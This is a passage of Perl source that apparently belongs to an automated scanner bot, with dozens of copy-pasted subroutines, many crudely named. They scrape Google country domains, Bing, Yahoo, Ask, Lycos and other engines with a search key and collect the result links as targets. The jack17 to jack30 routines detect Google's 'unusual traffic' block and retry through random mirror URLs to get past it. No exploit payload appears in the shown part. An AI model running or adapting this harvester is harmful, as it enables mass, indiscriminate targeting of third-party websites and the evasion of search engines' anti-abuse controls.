		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $random17[rand(scalar(@random17))];

               $jack17 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack17.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack18() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack18.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $random18[rand(scalar(@random18))];

               $jack18 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack18.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack19() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack19.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $random19[rand(scalar(@random19))];

               $jack19 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack19.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack20() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack20.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $random20[rand(scalar(@random20))];

               $jack20 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack20.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}



sub jack21() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack21.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $random21[rand(scalar(@random21))];

               $jack21 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack21.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /$badsite/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}



 

sub jack22() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack22.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $random22[rand(scalar(@random22))];

               $jack22 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack22.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /$badsite/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack23() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack23.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $random23[rand(scalar(@random23))];

               $jack23 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack23.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /$badsite/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack24() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack24.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $random24[rand(scalar(@random24))];

               $jack24 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack24.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /$badsite/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack25() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack25.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $random25[rand(scalar(@random25))];

               $jack25 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack25.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /$badsite/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack26() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack26.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack26 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack26.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /$badsite/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack27() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack27.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack27 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack27.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /$badsite/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack28() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack28.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack28 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack28.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /$badsite/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack29() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack29.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack29 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack29.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /$badsite/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack30() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack30.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack30 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack30.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /$badsite/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub kontol() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.com/search?q=".uri_escape($key)."&num=100&filter=0&start=".$i);

        my $res = search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub pepek() {

        my @list;

        my $key = $_[0];

        for ($b=0; $b<=100; $b+=1) {

        my $search = ("http://search.walla.co.il/?q=".uri_escape($key)."&type=text&page=".$b);

        my $res = search_engine_query($search);

        while ($res =~ m/<a href=\"http:\/\/(.+?)\" title=/g) {

            my $link = $1;

            if ($link !~ /walla\.co\.il/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub tetek(){

    my @list;

        my $key = $_[0];

        for ($b=1; $b<=1000; $b+=10) {

        my $search = ("http://search.yahoo.com/search?p=".uri_escape($key)."&b=".$b);

        my $res = search_engine_query($search);

        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {

            my $link = $1;

            if ($link !~ /yahoo\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub itil() {

        my @list;

        my $key = $_[0];

        for (my $i=1; $i<=1000; $i+=100) {

                my $search = ("http://uk.ask.com/web?q=".uri_escape($key)."&qsrc=1&frstpgo=0&o=0&l=dir&qid=05D10861868F8C7817DAE9A6B4D30795&page=".$i."&jss=");

                my $res = search_engine_query($search);

                while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

                        if ($link !~ /ask\.com/){

                                my @grep = &links($link);

                                push(@list,@grep);

                        }

                }

        }

        return @list;

}

 

sub nennen() {

        my @list;

        my $key = $_[0];

        my $b   = 0;

        for ($b=1; $b<=400; $b+=10) {

                my $search = ("http://szukaj.onet.pl/".$b.",query.html?qt=".uri_escape($key));

                my $res = search_engine_query($search);

                while ($res =~ m/<a href=\"http:\/\/(.*?)\">/g) {

                        my $link = $1;

                        if ($link !~ /onet|webcache|query/){

                                my @grep = &links($link);

                push(@list,@grep);

                        }

                }

        }

        return @list;

}

 

sub susu() {

    my @list;

        my $key = $_[0];

    my $b   = 0;

        for ($b=10; $b<=200; $b+=10) {

        my $search = ("http://search.yippy.com/search?input-form=clusty-simple&v%3Asources=webplus-ns-aaf&v%3Aproject=clusty&query=".uri_escape($key)."&v:state=root|root-".$b."-20|0&");

        my $res = search_engine_query($search);

                if ($res !~ /next/) {$b=100;}

        while ($res =~ m/<a href=\"http:\/\/(.*?)\"/g) {

            my $link = $1;

            if ($1 !~ /yippy\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub buahdada() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=400; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&first=".$i);

        my $res = search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

                        my $link = $1;

            if ($link !~ /google/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub payudara(){

    my @list;

        my $key = $_[0];

        for ($b=1; $b<=50; $b+=1) {

        my $search = ("http://pesquisa.sapo.pt/?barra=resumo&cluster=0&format=html&limit=10&location=pt&page=".$b."&q=".uri_escape($key)."&st=local");

        my $res = search_engine_query($search);

                if ($res !~ m/Next/i) {$b=50;}

        while ($res =~ m/<a href=\"http:\/\/(.*?)\"/g) {

            my $link = $1;

            if ($1 !~ /\.sapo\.pt/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub kentot() {

  my @list;

  my $key = $_[0];

    for ($b=0; $b<=50; $b+=1) {

        my $search = ("http://search.lycos.com/web?q=".uri_escape($key)."&pn=".$b);

        my $res = search_engine_query($search);

        while ($res =~ m/title=\"http:\/\/(.*?)\"/g) {

            my $link = $1;

            if ($link !~ /lycos\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;      

}

 

sub emel() {

        my @list;

        my $key = $_[0];

    for ($b=0; $b<=1000; $b+=10) {

        my $search = ("http://busca.uol.com.br/web/?ref=homeuol&q=".uri_escape($key)."&start=".$b);

        my $res = search_engine_query($search);

                if ($res =~ m/retornou nenhum resultado/i) {$b=500;}

        while ($res =~ m/href=\"?http:\/\/([^\">]*)\"/g) {

            my $link = $1;

            if ($link !~ /uol\.com\.br|\/web/i){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub oral() {

  my @list;

  my $key = $_[0];

    for ($b=0; $b<=50; $b+=1) {

        my $search = ("http://www.hotbot.com/search/web?pn=".$b."&q=".uri_escape($key));

        my $res = search_engine_query($search);

                if ($res =~ m/had no web result/i) {$b=50;}

        while ($res =~ m/href=\"http:\/\/(.+?)\" title=/g) {

            my $link = $1;

            if ($link !~ /hotbot\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;      

}

 

sub klitoris() {

        my @list;

        my $key = $_[0];

        for ($b=0; $b<=300; $b+=10) {

                my $search = ("http://search.aol.com/aol/search?q=".uri_escape($key)."&page=".$b);

                my $res = search_engine_query($search);

                while ($res =~ m/href=\"http:\/\/(.*?)\"/g) {

                        my $link = $1;

                        if ($link !~ /aol\.com/){

                                my @grep = &links($link);

                                push(@list,@grep);

                        }

                }

        }

        return @list;

}

 

sub masturbasi() {

  my @list;  

  my $key = $_[0];  

  for ($b=1; $b<=500; $b+=10) {

  #  $num += $num;

    my $search = "http://cgi.search.biglobe.ne.jp/cgi-bin/search-st_lp2?start=".$b."&ie=utf8&num=".$num."&q=".uri_escape($key)."&lr=all";

    my $res = search_engine_query($search);

    while ( $res =~ m/<a href=\"http:\/\/(.+?)\"/g ) {

            my $link = $1;

        if ($link !~ /biglobe/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub onani() {

  my @list;

  my $key = $_[0];

  my $b   = 0;

  my @doms = ("nl","au","br","ca","de","es","fr","it","uk");

  foreach my $domain (@doms) { #$dom = $doms[rand(scalar(@doms))];

    for (my $i=1; $i<=1000; $i+=100) {

        my $search = ("http://".$domain.".search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);

        my $res = search_engine_query($search);

        while ($res =~ m/http\%3a\/\/(.+?)\//g) {

            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);

				}

			}

		} return @list;

	}

}

 

sub sperma() {

    my @list;

    my $key = $_[0];

    for (my $i=10; $i<=1000; $i+=100){

        my $search = ("http://www.kvasir.no/alle?offset=".$i."&q=".uri_escape($key)."");

        my $res = search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.+?)\//g) {

            my $link = $1; if ($link !~ /kvasir/){ $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub anal() {

    my @lst;

    my $key = $_[0];

    for (my $i=0; $i<=50; $i+=1){

        my $search = ("http://zuhrina.com/google/search.php?q=".uri_escape($key)."&num=100&filter=N&start=".$i."&sa=N");

        my $res = search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/(.+?)\//g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@lst,@grep);

            }

        }

    }

    return @lst;

 }  

        

               

sub puting() {

    my @list;

    my $key = $_[0];

    for ($b=1; $b<=1000; $b+=100) {

        my $search = ("http://search.seznam.cz/?q=".uri_escape($key)."&count=10&pId=SkYLl2GXwV0CZZUQcglt&from=".$b);

        my $res = search_engine_query($search);

        while ($res =~ m/<a href=\"http:\/\/(.+?)\" title/g) {

            if ($1 !~ /seznam/){

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub vagina(){

    my @list;

    my $key = $_[0];

    my $i   = 0;

    for ($i=0; $i<=100; $i+=1){

        my $web=("http://startgoogle.startpagina.nl/index.php?q=".uri_escape($key)."&start=".$i."&origin=homepage&source=geentaal");           

        my $Res= search_engine_query($web);

        while ($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){

            if ($1 !~ /pagina|pagina's/){

                my $k=$1;

                my @grep=&links($k);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub penis(){

        my @list;

        my $key = $_[0];

        for($b=1;$b<=1000;$b+=100){

                my $Th=("http://www.google.pt/search?q=".uri_escape($key)."&in=Mundial&num=25&ckWhere=Mundo&position=".$b."");

                my $Res=search_engine_query($Th);

                while($Res =~ m/href=\"http:\/\/(.+?)\//g){

                        my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);

                }

        }

return @list;

}

 

 sub ZuhRina() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://zuhrina.com/google/search.php?q=".uri_escape($key)."&num=100&filter=N&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}



sub memek() {

  my @list;

    my $key = $_[0];

    for (my $i=1; $i<=50; $i+=1) {

        my $search = ("http://it.ask.com/web?q=".uri_escape($key)."&qsrc=0&o=0&l=dir&qid=EE90DE6E8F5370F363A63EC61228D4FE&page=".$i."&jss=1&dm=all");

        my $res = search_engine_query($search);

                if ($res !~ /Successiva/) {$i=50;}

        while ($res =~ m/href=\"http:\/\/(.+?)\" onmousedown=\"/g) {

            if ($1 !~ /ask\.com/){

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}



sub googleCA() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.ca/search?q=".uri_escape($key)."&hl=&cr=countryCA&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleCA/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleDE() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.de/search?q=".uri_escape($key)."&hl=&cr=countryDE&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleDE/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleUK() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.co.uk/search?q=".uri_escape($key)."&hl=&cr=countryUK&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleUK/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleFR() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.fr/search?q=".uri_escape($key)."&hl=&cr=countryFR&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleFR/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleES() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.es/search?q=".uri_escape($key)."&hl=&cr=countryES&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleES/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleIT() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.it/search?q=".uri_escape($key)."&hl=&cr=countryIT&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleIT/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(1);

sub googleNL() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.nl/search?q=".uri_escape($key)."&hl=&cr=countryNL&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleNL/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleBE() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.be/search?q=".uri_escape($key)."&hl=&cr=countryBE&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleBE/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleCH() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.ch/search?q=".uri_escape($key)."&hl=&cr=countryCH&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleCH/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(1);

sub googleSE() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.se/search?q=".uri_escape($key)."&hl=&cr=countrySE&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleSE/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleDK() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.dk/search?q=".uri_escape($key)."&hl=&cr=countryDK&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleDK/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleNO() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.no/search?q=".uri_escape($key)."&hl=&cr=countryNO&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleNO/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(1);

sub googleNZ() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.co.nz/search?q=".uri_escape($key)."&hl=&cr=countryNZ&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleNZ/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleIE() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.ie/search?q=".uri_escape($key)."&hl=&cr=countryIE&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleIE/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleBR() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.com.br/search?q=".uri_escape($key)."&hl=&cr=countryBR&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(2);

sub googleAR() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.com.ar/search?q=".uri_escape($key)."&hl=&cr=countryAR&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleAR/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleCO() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.com.co/search?q=".uri_escape($key)."&hl=&cr=countryCO&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleCO/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleCU() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.com.cu/search?q=".uri_escape($key)."&hl=&cr=countryCU&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleCU/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(2);

sub googleCL() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.cl/search?q=".uri_escape($key)."&hl=&cr=countryCL&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleCL/){

